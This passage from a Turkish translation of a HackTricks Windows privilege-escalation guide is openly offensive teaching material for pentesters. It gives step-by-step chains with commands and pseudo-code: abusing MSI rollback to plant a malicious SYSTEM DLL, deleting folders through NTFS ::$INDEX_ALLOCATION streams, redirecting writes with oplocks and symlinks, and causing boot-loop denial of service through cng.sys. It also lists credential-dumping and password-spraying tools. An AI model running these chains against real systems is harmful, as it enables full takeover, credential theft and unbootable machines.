1. **Stage 1 – Hijack için hazırlık (`C:\Config.Msi` klasörünü boş bırakın)**

- Step 1: MSI'ı yükleyin
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin; böylece **non-admin user** bunu çalıştırabilir.
- Yükleme işleminden sonra dosyaya ait bir **handle**'ı açık tutun.

- Step 2: Uninstall'ı başlatın
- Aynı `.msi` dosyasını uninstall edin.
- Uninstall işlemi dosyaları `C:\Config.Msi` klasörüne taşımaya ve bunları `.rbf` dosyaları (rollback backups) olarak yeniden adlandırmaya başlar.
- Dosya `C:\Config.Msi\<random>.rbf` haline geldiğinde bunu algılamak için açık dosya **handle**'ını `GetFinalPathNameByHandle` kullanarak **poll** edin.

- Step 3: Custom Syncing
- `.msi`, şu işlemleri yapan bir **custom uninstall action (`SyncOnRbfWritten`)** içerir:
- `.rbf` yazıldığında signal gönderir.
- Ardından uninstall işlemine devam etmeden önce başka bir event üzerinde **wait** eder.

- Step 4: `.rbf` dosyasının silinmesini engelleyin
- Signal geldiğinde `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **open** edin — bu işlem dosyanın silinmesini **engeller**.
- Ardından uninstall işleminin tamamlanabilmesi için geri signal gönderin.
- Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için `C:\Config.Msi` kaldırılmaz.

- Step 5: `.rbf` dosyasını manuel olarak silin
- Siz (attacker) `.rbf` dosyasını manuel olarak silin.
- Artık `C:\Config.Msi` boştur ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` klasörünü silmek için **SYSTEM-level arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Stage 2 – Rollback script'lerini malicious script'lerle değiştirme**

- Step 6: `C:\Config.Msi` klasörünü zayıf ACL'lerle yeniden oluşturun
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **Weak DACLs** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` içeren bir **handle**'ı açık tutun.

- Step 7: Başka bir install çalıştırın
- `.msi` dosyasını şu ayarlarla tekrar install edin:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Zorunlu bir failure'ı tetikleyen bir variable.
- Bu install, `.rbs` ve `.rbf` dosyalarını tekrar okuyacak olan **rollback** işlemini tetiklemek için kullanılacaktır.

- Step 8: `.rbs` dosyasını monitor edin
- Yeni bir `.rbs` görünene kadar `C:\Config.Msi` klasörünü monitor etmek için `ReadDirectoryChangesW` kullanın.
- Dosya adını alın.

- Step 9: Rollback öncesinde sync edin
- `.msi`, şu işlemleri yapan bir **custom install action (`SyncBeforeRollback`)** içerir:
- `.rbs` oluşturulduğunda bir event signal eder.
- Ardından devam etmeden önce **wait** eder.

- Step 10: Weak ACL'leri yeniden uygulayın
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer, `C:\Config.Msi` klasörüne **strong ACLs**'leri yeniden uygular.
- Ancak hâlâ `WRITE_DAC` içeren bir handle'a sahip olduğunuz için **weak ACLs**'leri tekrar uygulayabilirsiniz.

> ACL'ler **yalnızca handle open sırasında uygulanır**, bu nedenle klasöre hâlâ yazabilirsiniz.

- Step 11: Fake `.rbs` ve `.rbf` dosyalarını bırakın
- `.rbs` dosyasının üzerine, Windows'a şunları söyleyen **fake rollback script** yazın:
- `.rbf` dosyanızı (malicious DLL) **privileged location**'a (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) restore edin.
- **Malicious SYSTEM-level payload DLL** içeren fake `.rbf` dosyanızı bırakın.

- Step 12: Rollback'i tetikleyin
- Installer'ın devam etmesi için sync event'ine signal gönderin.
- Bir **type 19 custom action (`ErrorOut`)**, install işlemini bilinen bir noktada **intentionally fail** edecek şekilde yapılandırılmıştır.
- Bu işlem **rollback'in başlamasına** neden olur.

- Step 13: SYSTEM DLL'inizi install eder
- Windows Installer:
- Malicious `.rbs` dosyanızı okur.
- `.rbf` DLL'inizi target location'a kopyalar.
- Artık **SYSTEM-loaded path** içindeki malicious DLL'inize sahipsiniz.

- Final Step: SYSTEM code'u execute edin
- Hijack ettiğiniz DLL'i load eden güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Boom**: Code'unuz **SYSTEM** olarak execute edilir.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (önceki teknik), **tam bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki vulnerability yalnızca **arbitrary file deletion** sağlıyorsa?

**NTFS internals**'ı exploit edebilirsiniz: her klasörün şu adla adlandırılan gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **index metadata** bilgisini depolar.

Bu nedenle, bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS klasörün tamamını dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API çağırıyor olsanız da, **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'ınız rastgele file/klasörleri silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir klasörün *içeriğini* silmeye izin veriyorsa** ne olur?

1. Adım 1: Bir yem klasörü ve file oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Oplock, yetkili bir process `file1.txt` dosyasını silmeye çalıştığında **yürütmeyi duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM process'ini tetikleyin (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback'i içinde – silme işlemini yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
- Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
- `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i vaktinden önce serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS internal stream'i hedefler — onu silmek klasörü siler.

5. Adım 5: Oplock'i serbest bırakma
- SYSTEM process devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle aslında şunu silmektedir:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Arbitrary Folder Create ile Kalıcı DoS

**Dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile, **SYSTEM/admin olarak arbitrary folder oluşturmanıza** olanak tanıyan bir primitive'i exploit edin.

**Kritik bir Windows driver'ının** adını kullanarak bir **folder** (**file** değil) oluşturun, örneğin:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- Bunu **önceden bir klasör olarak oluşturursanız**, Windows gerçek driver'ı boot sırasında yükleyemez.
- Ardından Windows, boot sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümleyemez** ve **boot işlemi çöker veya durur**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya disk erişimi) olmadan **kurtarma mümkün değildir**.

### Privileged log/backup paths + OM symlinks ile arbitrary file overwrite / boot DoS

Bir **privileged service**, log'ları/export'ları **writable config** dosyasından okunan bir yola yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile redirect ederek privileged write işlemini arbitrary overwrite işlemine dönüştürebilirsiniz (**SeCreateSymbolicLinkPrivilege olmadan bile**).

**Requirements**
- Hedef yolu depolayan config, attacker tarafından writable olmalıdır (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna bir mount point ve bir OM file symlink oluşturma yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Bu yola yazan bir privileged operation (log, export, report).

**Example chain**
1. Privileged log destination'ı kurtarmak için config'i okuyun; örneğin `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu admin olmadan redirect edin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin log'u yazmasını bekleyin (ör. yönetici "test SMS'i gönder" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna gerçekleşir.
4. Üzerine yazılan hedefi (hex/PE parser ile) inceleyerek bozulmayı doğrulayın; yeniden başlatma, Windows'un değiştirilmiş sürücü yolunu yüklemesine neden olur ve **boot loop DoS** oluşturur. Bu yöntem, ayrıcalıklı bir servisin yazma amacıyla açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir, ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopya denenebilir; bu da onu bozuk veriler için güvenilir bir DoS hedefi haline getirir.



## **High Integrity'den System'e**

### **Yeni servis**

Zaten bir High Integrity işlemi üzerinde çalışıyorsanız, **SYSTEM'e giden yol** yalnızca yeni bir **servis oluşturup çalıştırarak** kolayca kat edilebilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20s içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity process içinden **AlwaysInstallElevated registry entries** değerlerini **enable** etmeyi ve _**.msi**_ wrapper kullanarak bir reverse shell **install** etmeyi deneyebilirsiniz.\
İlgili registry keys ve bir _.msi_ package'ın nasıl install edileceği hakkında [daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Bu token privileges değerlerine sahipseniz (muhtemelen bunları zaten High Integrity olan bir process içinde bulacaksınız), SeDebug privilege ile **neredeyse tüm process'leri** (protected processes hariç) **open edebilir**, process'in **token'ını copy edebilir** ve bu **token ile arbitrary bir process oluşturabilirsiniz**.\
Bu teknik kullanılırken genellikle **tüm token privileges değerlerine sahip SYSTEM olarak çalışan herhangi bir process** seçilir (_evet, tüm token privileges değerlerine sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan kod örneğini** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, `getsystem` içinde privilege escalation yapmak için meterpreter tarafından kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazmak için bir service oluşturma/kötüye kullanma** işleminden oluşur. Daha sonra pipe'ı **`SeImpersonate`** privilege kullanarak oluşturan **server**, pipe client'ının (service) **token'ını impersonate edebilir** ve SYSTEM privileges elde edebilir.\
Name pipes hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
High integrity'den name pipes kullanarak System'e **[**nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **loaded** edilen bir dll'yi **hijack** etmeyi başarırsanız, bu permissions ile arbitrary code çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır; ayrıca, dll'leri load etmek için kullanılan folder'lar üzerinde **write permissions** bulunacağından **high integrity process'ten gerçekleştirilmesi çok daha kolaydır**.\
**Dll hijacking hakkında** [**daha fazla bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vector'lerini bulmak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfiguration'ları ve sensitive file'ları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- bazı olası misconfiguration'ları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfiguration'ları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP saved session bilgilerini extract eder. Local ortamda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan crendentials extract eder. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- toplanan password'leri domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle tool'udur.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- bilinen privesc vulnerabilities'lerini arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights gerekli)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- bilinen privesc vulnerabilities'lerini arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfiguration'ları aramak için host'u enumerate eder (privesc tool'undan çok bilgi toplama tool'udur) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- birçok software'den credentials extract eder (github'da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# port'u**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration'ı kontrol eder (github'da executable precompiled). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- olası misconfiguration'ları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- bu post temel alınarak oluşturulmuş tool (düzgün çalışması için accesschk erişimi gerektirmez ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET version'ını kullanarak compile etmelisiniz ([**buraya bakın**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host üzerinde yüklü .NET version'ını görmek için şunu çalıştırabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Kaynaklar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi şifre çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi ve Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Geçmişe Bir Link. Windows'ta Symbolic Link'lerin Kötüye Kullanılması](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Windows'ta Tehlikeli Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [Pwn2Own with Microslop: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [Hepsine Hükmedecek Bir I/O Ring: Windows 11'de Tam Okuma/Yazma Exploit Primitive'ı](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)

{{#include ../../banners/hacktricks-training.md}}
